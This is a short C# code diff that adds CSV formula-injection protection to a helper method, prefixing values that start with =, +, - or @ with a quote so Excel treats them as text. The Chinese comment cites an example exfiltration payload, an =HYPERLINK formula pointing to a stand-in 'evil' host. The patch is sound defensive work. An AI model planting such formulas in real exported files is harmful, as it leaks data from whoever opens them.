@@ -59,6 +59,12 @@ public static class ExcelHelper
     public static string EscapeCsvValue(string? value)
     {
         if (string.IsNullOrEmpty(value)) return string.Empty;
+
+        // 公式注入防护：以 = + - @ 开头的值会被 Excel 当公式执行
+        // （如 =HYPERLINK("http://evil",...) 可外泄数据），前置单引号并加引号强制按文本处理。
+        if ("=+-@".Contains(value[0]))
+            return $"\"'{value.Replace("\"", "\"\"")}\"";
+
         if (value.Contains(',') || value.Contains('"') || value.Contains('\n') || value.Contains('\r'))
         {
             return $"\"{value.Replace("\"", "\"\"")}\"";
